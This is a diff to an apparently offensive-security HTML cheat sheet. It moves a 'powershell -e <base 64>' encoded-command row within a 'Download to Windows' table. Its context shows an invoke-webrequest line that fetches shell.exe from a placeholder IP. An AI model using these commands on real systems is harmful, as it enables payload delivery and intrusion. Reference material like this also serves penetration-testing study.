@@ -511,6 +511,10 @@
     <li>Download to Windows</li>
     <table>
         <tr>
+            <td>Base64 Decoding</td>
+            <td><li>powershell -e &lt;base 64&gt;</li></td>
+        </tr>
+        <tr>
             <td>Download file</td>
             <td>
                 <li>invoke-webrequest -Uri http://&lt;ip address&gt;/shell.exe [-OutFile &lt;file&gt;]</li>
@@ -610,10 +614,6 @@
                     </table>
                 </table>
             </td>
-        </tr>
-        <tr>
-            <td>Base64 Decoding</td>
-            <td><li>powershell -e &lt;base 64&gt;</li></td>
         </tr>
     </table>
 
